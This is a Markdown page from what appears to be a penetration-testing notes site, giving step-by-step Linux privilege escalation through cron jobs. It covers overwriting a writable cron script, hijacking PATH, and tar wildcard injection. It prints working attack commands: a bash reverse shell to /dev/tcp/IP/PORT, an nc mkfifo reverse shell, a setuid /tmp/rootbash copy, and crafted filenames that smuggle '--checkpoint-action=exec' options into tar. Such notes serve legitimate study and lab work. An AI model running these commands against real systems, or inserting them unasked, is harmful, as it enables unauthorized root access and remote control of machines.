---
title: Cron Jobs
parent: Method (Linux)
layout: default
nav_order: 3
---

User crontab common location: `/var/spool/cron/` or `/var/spool/cron/crontabs/`

System wide crontab location: `/etc/crontab`


## File permissions
1. Check the crontab file:\
   `cat /etc/crontab`
2. If there is any script locate it:\
   `locate overwrite.sh`
3. Check for the permission:\
   `ls -l /usr/local/bin/overwrite.sh`
4. If can write, modify the file to be as file below.
5. Run `nc` and wait for the listener to catch.

xx.sh
```
#!/bin/bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

## PATH Environment Variables
1. The crontab file has path set (default is `/usr/bin:/bin`, meaning look in `/usr/bin` first before look in `/bin`).
2. If you run `cat /etc/crontab` and find any script that don't use absolute path, can try to replace the script by creating a script file listed in PATH. (for eg if `PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, can try create at `/home/user`) with the content below.
3. Ensure the script you created is executable (`chmod +x /home/user/xx.sh`)
4. Wait for the cronjob to run, and execute with -p to retain effective id:\
   `/tmp/rootbash -p`

xx.sh
```
#!/bin/bash
​
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

## Wildcard & Filenames
1. When use wildcard(`*`), will list out all file/folder name, space separated. For eg if you use `echo *` in home directory, probably will see results of `echo Desktop Documents...` (result: `Desktop Documents...`)
2. This can be abused because we can set complex options, like `--option=key=value` as a filename.
3. If you see in `/etc/crontab` that points to a script, and that script contains wildcard(`*`), potentially can abuse.
4. For example there is a tar wildcard in the compress.sh attached below, running in /home/user directory.
5. Check gtfobins for tar (https://gtfobins.github.io/gtfobins/tar/) and notice that tar can break out by setting some options (`--checkpoint=1 --checkpoint-action=exec=/bin/sh`)
6. Use default linux reverse shell. Create a bash file under /home/user(eg shell.sh):\
   `mkfifo /tmp/bzxltd; nc IP PORT 0</tmp/bzxltd | /bin/sh >/tmp/bzxltd 2>&1; rm /tmp/bzxltd`
7. Create the file below under /home/user (or you can use `echo "" >> filename`):\
   `touch ./--checkpoint=1`
   `touch ./"--checkpoint-action=exec=sh shell.sh"`
8. Wait for the cron job to run.